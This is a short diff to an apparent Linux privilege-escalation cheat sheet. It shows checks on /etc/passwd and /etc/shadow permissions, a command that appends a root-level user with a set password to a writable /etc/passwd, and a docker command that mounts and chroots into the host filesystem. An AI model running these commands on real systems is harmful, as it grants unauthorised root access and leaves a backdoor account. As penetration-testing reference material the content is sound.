@@ -108,11 +108,11 @@ https://gtfobins.github.io/
 ```
 ls -la /etc/passwd
 ls -la /etc/shadow
-
 ```
+
 -> Exploitation  
 ```
-echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
+echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
 
 ### NFS Root Squashing
@@ -168,6 +168,9 @@ docker images
 ```
 docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
 ```
+
+### Other Tips
+In Construction [X]
 
 ### Linux Enumeration Tools [PrivEsc]
 
